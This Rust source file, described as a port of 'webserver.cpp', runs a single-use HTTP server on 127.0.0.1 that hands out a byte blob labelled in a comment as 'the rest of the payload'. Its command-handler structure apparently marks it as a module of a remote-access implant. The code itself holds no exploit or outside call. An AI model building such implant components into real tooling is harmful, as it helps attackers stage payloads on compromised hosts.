//! Port of webserver.cpp — a one time use local HTTP server.

use crate::channel_tcp::channel_winsock_init;
use crate::parse::DataP;
use crate::state::THREAD_COUNT;
use crate::thread::run_thread_start;
use std::sync::atomic::Ordering;
use windows_sys::Win32::Networking::WinSock::*;

/// Per-request server state (serverdata).
struct ServerData {
    socket: SOCKET,
    length: i32,
    hlength: i32,
    data: Vec<u8>,
    header: Vec<u8>,
    getit: Vec<u8>,
}

/// Build the server package (serverdata_build).
fn serverdata_build(socket: SOCKET, data: &[u8], length: i32) -> ServerData {
    // push our data into this server package
    let data = data[..length as usize].to_vec();

    // allocate our header info too
    let header = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
        length
    )
    .into_bytes();
    let hlength = header.len() as i32;

    // allocate our temporary buffer
    ServerData {
        socket,
        length,
        hlength,
        data,
        header,
        getit: vec![0u8; 2048],
    }
}

/// Grab some stuff (recv_line): read one CRLF-terminated line.
fn recv_line(my_sock: SOCKET, buffer: &mut [u8], max: usize) -> i32 {
    let mut read = 0usize;
    unsafe {
        while read < max {
            let status = recv(my_sock, buffer[read..].as_mut_ptr(), 1, 0);
            if status <= 0 {
                return SOCKET_ERROR;
            }

            // should be 1 byte
            read += status as usize;

            // we're good to go y0
            if read >= 2 && buffer[read - 1] == b'\n' && buffer[read - 2] == b'\r' {
                buffer[read - 2] = 0;
                return read as i32;
            }
        }
    }
    SOCKET_ERROR
}

/// Serve a single connection (serveit_thread).
fn serveit_thread(mut sdata: ServerData) {
    unsafe {
        // accept the connection
        let client_sock = accept(sdata.socket, std::ptr::null_mut(), std::ptr::null_mut());

        if client_sock == INVALID_SOCKET {
            closesocket(sdata.socket);
            THREAD_COUNT.fetch_sub(1, Ordering::SeqCst);
            return;
        }

        // get some stuff
        while recv_line(client_sock, &mut sdata.getit, 2048) > 2 {
            // keep reading!
        }

        // send it
        send(client_sock, sdata.header.as_ptr(), sdata.hlength, 0);
        send(client_sock, sdata.data.as_ptr(), sdata.length, 0);

        // clean up y0
        closesocket(sdata.socket);
        closesocket(client_sock);

        // decrement our threadcount
        THREAD_COUNT.fetch_sub(1, Ordering::SeqCst);
    }
}

/// Spin up a one time use web server (serveit).
pub fn serveit(port: u16, data: &[u8], length: i32) {
    unsafe {
        // init winsock
        channel_winsock_init();

        // setup our socket
        let server_sock = socket(AF_INET as i32, SOCK_STREAM, 0);
        if server_sock == INVALID_SOCKET {
            closesocket(server_sock);
            return;
        }

        // specify the host/port we want to bind to
        let mut sock: SOCKADDR_IN = std::mem::zeroed();
        sock.sin_family = AF_INET;
        sock.sin_port = port.to_be(); // htons
        sock.sin_addr.S_un.S_addr = 0x0100_007f; // 127.0.0.1

        // start our server
        let status = bind(
            server_sock,
            &sock as *const SOCKADDR_IN as *const _,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        );
        if status == SOCKET_ERROR {
            closesocket(server_sock);
            return;
        }

        // listen for a connection... *pHEAR*
        let status = listen(server_sock, 120);
        if status == SOCKET_ERROR {
            closesocket(server_sock);
            return;
        }

        // make our serverdata object
        let sdata = serverdata_build(server_sock, data, length);

        run_thread_start(move || serveit_thread(sdata));
    }
}

/// Start a local webserver on the specified port serving the rest of the payload.
pub fn command_webserver_local(buffer: &[u8], length: usize) {
    let mut data = buffer[..length].to_vec();
    let mut parser = DataP::init(&mut data);

    let port = parser.data_short();
    let mydata = parser.data_buffer();
    let mylen = parser.data_length();

    serveit(port, mydata, mylen as i32);
}
